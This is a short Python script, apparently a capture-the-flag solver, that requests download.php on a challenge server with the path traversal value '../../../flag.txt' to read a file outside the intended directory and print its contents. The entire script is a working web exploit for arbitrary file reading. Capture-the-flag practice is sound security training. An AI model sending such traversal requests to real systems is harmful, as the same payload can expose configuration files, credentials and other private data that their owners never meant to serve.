import requests

url = "http://chal.thjcc.org:30000/"

res = requests.get(f'{url}/download.php?file=../../../flag.txt')

print("Flag:", res.text)